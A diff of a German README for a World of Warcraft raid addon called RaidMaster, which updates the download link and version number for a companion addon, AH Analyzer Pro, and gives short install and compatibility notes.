@@ -7,7 +7,7 @@ Raid-Werkzeuge für die Gilde auf **WoW Forever**.
 **Aktuelle Version: [RaidMaster-1.8.2.zip](https://github.com/andreasuhlmann78-create/raidmaster/raw/main/download/RaidMaster-1.8.2.zip)**
 (immer die neueste: [RaidMaster-latest.zip](https://github.com/andreasuhlmann78-create/raidmaster/raw/main/download/RaidMaster-latest.zip))
 
-**AH Analyzer Pro:** [AHAnalyzerPro-5.9.12.zip](https://github.com/andreasuhlmann78-create/raidmaster/raw/main/download/AHAnalyzerPro-5.9.12.zip)
+**AH Analyzer Pro:** [AHAnalyzerPro-0.59.14.zip](https://github.com/andreasuhlmann78-create/raidmaster/raw/main/download/AHAnalyzerPro-0.59.14.zip)
 
 ZIP entpacken und den Ordner `RaidMaster` nach `Interface/AddOns` kopieren (alten Ordner ersetzen).
 Läuft in allen WoW-Versionen (Classic Era, WoW Forever, TBC, Wrath, Cata, MoP Classic, Retail) und in 11 Sprachen – mit allen Raids von Classic bis Midnight (Taktiken, Raidchat-Infos, Markierungsvorlagen).
